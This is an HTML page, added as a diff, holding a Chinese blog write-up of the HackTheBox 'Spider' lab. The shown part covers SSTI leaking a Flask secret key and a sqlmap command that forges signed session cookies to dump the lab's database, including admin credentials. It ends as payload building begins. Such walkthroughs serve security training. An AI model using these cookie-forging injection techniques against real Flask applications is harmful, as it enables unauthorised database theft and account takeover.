@@ -1,0 +1,1107 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="每周练手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Spider">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/Spider/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="每周练手">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/c739de0597e2b34ea874433a81536931.png">
+<meta property="article:published_time" content="2021-12-07T05:01:01.000Z">
+<meta property="article:modified_time" content="2022-04-14T10:56:52.368Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/c739de0597e2b34ea874433a81536931.png">
+  
+  
+  
+  <title>HackTheBox - Spider - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox - Spider"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-12-07 13:01" pubdate>
+          2021年12月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          67 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HackTheBox"
+        id="heading-d9fb08be3ed131369df5d4aa808dac70" role="tab" data-toggle="collapse" href="#collapse-d9fb08be3ed131369df5d4aa808dac70"
+        aria-expanded="true"
+      >
+        HackTheBox
+        <span class="list-group-count">(16)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-d9fb08be3ed131369df5d4aa808dac70"
+           role="tabpanel" aria-labelledby="heading-d9fb08be3ed131369df5d4aa808dac70">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - BountyHunter</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Cap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Driver</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Horizontall</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Intelligence/" title="HackTheBox - Intelligence"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Intelligence</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Monitors/" title="HackTheBox - Monitors"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Monitors</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Previse/" title="HackTheBox - Previse"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Previse</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Schooled/" title="HackTheBox - Schooled"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Schooled</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Seal</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Shibboleth</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Sink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">HackTheBox - Spider</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Archetype</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/05/19/HTB/Unicode/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/dynstr/" title="HackTheBox - dynstr"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - dynstr</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox - Spider</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月14日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="0x01-端口探测"><a href="#0x01-端口探测" class="headerlink" title="0x01 端口探测"></a>0x01 端口探测</h1><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -v <span class="hljs-number">10.10.10.243</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">2048</span> <span class="hljs-number">28</span>:f1:<span class="hljs-number">61</span>:<span class="hljs-number">28</span>:<span class="hljs-number">01</span>:<span class="hljs-number">63</span>:<span class="hljs-number">29</span>:<span class="hljs-number">6</span>d:c5:<span class="hljs-number">03</span>:<span class="hljs-number">6</span>d:a9:f0:b0:<span class="hljs-number">66</span>:<span class="hljs-number">61</span> (RSA)<br>|   <span class="hljs-type">256</span> <span class="hljs-number">3</span>a:<span class="hljs-number">15</span>:<span class="hljs-number">8</span>c:cc:<span class="hljs-number">66</span>:f4:<span class="hljs-number">9</span>d:cb:ed:<span class="hljs-number">8</span>a:<span class="hljs-number">1</span>f:f9:d7:ab:d1:cc (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> a6:d4:<span class="hljs-number">0</span>c:<span class="hljs-number">8</span>e:<span class="hljs-number">5</span>b:aa:<span class="hljs-number">3</span>f:<span class="hljs-number">93</span>:<span class="hljs-number">74</span>:d6:a8:<span class="hljs-number">08</span>:c9:<span class="hljs-number">52</span>:<span class="hljs-number">39</span>:<span class="hljs-number">09</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1.14</span><span class="hljs-number">.0</span> (Ubuntu)<br>| <span class="hljs-type">http</span>-methods: <br>|<span class="hljs-type">_</span>  Supported Methods: GET HEAD POST OPTIONS<br>|<span class="hljs-type">_http</span>-server-header: nginx/<span class="hljs-number">1.14</span><span class="hljs-number">.0</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: Did not follow redirect to http://spider.htb/<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x02-WebShell-x2F-User-Shell"><a href="#0x02-WebShell-x2F-User-Shell" class="headerlink" title="0x02 WebShell&#x2F;User Shell"></a>0x02 WebShell&#x2F;User Shell</h1><p>访问80端口，直接跳转到spider.htb，然后报错：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023123446608.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023123446608"></p>
+<p>在&#x2F;etc&#x2F;hosts将域名和端口进行绑定</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023123627556.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023123627556"></p>
+<p>重新访问spider.htb，界面正常。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023123540245.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023123540245"></p>
+<p>抓包能够发现携带了cookie，根据cookie形式推测后端使用了flask：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023124830611.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023124830611"></p>
+<p>在用户注册界面尝试SSTI，用户名输入4：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023125010739.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023125010739"></p>
+<p>然后进入登录后界面的USER INFORMATION界面：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023125145997.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023125145997"></p>
+<p>发现成功解析：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023125153697.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023125153697"></p>
+<p>试着读一下config：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023132136519.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023132136519"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023132405045.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023132405045"></p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&lt;Config &#123;<span class="hljs-string">&#x27;ENV&#x27;</span>: <span class="hljs-string">&#x27;production&#x27;</span>, <span class="hljs-string">&#x27;DEBUG&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;TESTING&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#x27;</span>, <span class="hljs-string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(<span class="hljs-number">31</span>), <span class="hljs-string">&#x27;USE_X_SENDFILE&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="hljs-string">&#x27;session&#x27;</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: datetime.timedelta(<span class="hljs-number">0</span>, <span class="hljs-number">43200</span>), <span class="hljs-string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;JSON_AS_ASCII&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;JSON_SORT_KEYS&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>, <span class="hljs-string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: <span class="hljs-number">4093</span>, <span class="hljs-string">&#x27;RATELIMIT_ENABLED&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;RATELIMIT_DEFAULTS_PER_METHOD&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;RATELIMIT_SWALLOW_ERRORS&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADERS_ENABLED&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;RATELIMIT_STORAGE_URL&#x27;</span>: <span class="hljs-string">&#x27;memory://&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_STRATEGY&#x27;</span>: <span class="hljs-string">&#x27;fixed-window&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADER_RESET&#x27;</span>: <span class="hljs-string">&#x27;X-RateLimit-Reset&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADER_REMAINING&#x27;</span>: <span class="hljs-string">&#x27;X-RateLimit-Remaining&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADER_LIMIT&#x27;</span>: <span class="hljs-string">&#x27;X-RateLimit-Limit&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADER_RETRY_AFTER&#x27;</span>: <span class="hljs-string">&#x27;Retry-After&#x27;</span>, <span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>: <span class="hljs-string">&#x27;static/uploads&#x27;</span>&#125;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>flask-session-cookie-manager</code>对cookie进行解密，发现以uuid形式存储。即在这条路我们需要拿到管理员的uuid。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">E:\flask-session-cookie-manager-master&gt;python flask_session_cookie_manager3<span class="hljs-selector-class">.py</span> decode -s Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942 -c eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IjM3MTFkYzU0LThhZDEtNDNjOC05YjBlLTU5YjIzNzU5ZmU0MiJ9<span class="hljs-selector-class">.YXORyQ</span>.<span class="hljs-number">5</span>Gl9TfDi1A0VQnsvjoEbBdJFLxU<br><br>&#123;<span class="hljs-string">&#x27;cart_items&#x27;</span>: <span class="hljs-selector-attr">[]</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>: <span class="hljs-string">&#x27;3711dc54-8ad1-43c8-9b0e-59b23759fe42&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>换一条路试试命令执行，发现被限制了字符数，不太可能绕过：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023132211989.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023132211989"></p>
+<p>继续探索，最后在hacktricks上找到了一个关于flask的session注入的问题：</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval">https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval</a></p>
+<blockquote>
+<p><strong>Sqlmap</strong> allows the use of <code>-e</code> or <code>--eval</code> to process each payload before sending it with some python oneliner. This makes very easy and fast to process in custom ways the payload before sending it. In the following example the <strong>flask cookie session</strong> <strong>is signed by flask with the known secret before sending it</strong>:</p>
+</blockquote>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap http:<span class="hljs-string">//1.1.1.1/sqli</span> <span class="hljs-params">--eval</span> <span class="hljs-string">&quot;from flask_unsign import session as s; session = s.sign(&#123;&#x27;uid&#x27;: session&#125;, secret=&#x27;SecretExfilratedFromTheMachine&#x27;)&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;session=*&quot;</span> <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>这里一开始没弄出来，最后发现是VPN的问题。换了个VPN后能跑出数据：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap http://spider.htb/ --eval &quot;from flask_unsign import session as s; session = s.sign(&#123;&#x27;uuid&#x27;: session&#125;, secret=&#x27;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#x27;)&quot; --cookie=&quot;session=*&quot; --dump<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023195948896.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023195948896"></p>
+<p> dump后的数据如下，第一条即为管理员的信息：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023200030569.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023200030569"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">129f60ea</span>-<span class="hljs-number">30</span>cf-<span class="hljs-number">4065</span>-afb9-<span class="hljs-number">6</span>be45ad38b73<br><span class="hljs-attribute">chiv</span><br><span class="hljs-attribute">ch1VW4sHERE7331</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>以管理员身份登录，发现直接进入了admin panel：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023200249460.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023200249460"></p>
+<p>然年后有一个supportportal的url：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023200316675.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023200316675"></p>
+<p><a target="_blank" rel="noopener" href="http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal">http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</a></p>
+<p>界面如下，不出意外的话又是一个SSTI：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023200704317.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023200704317"></p>
+<p>然后发现有WAF：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023202237405.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023202237405"></p>
+<p>最后构造出Payload的过程如下：</p>
+<p>首先去<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass">PayloadAllTheThings</a>上找了个Payload：</p>
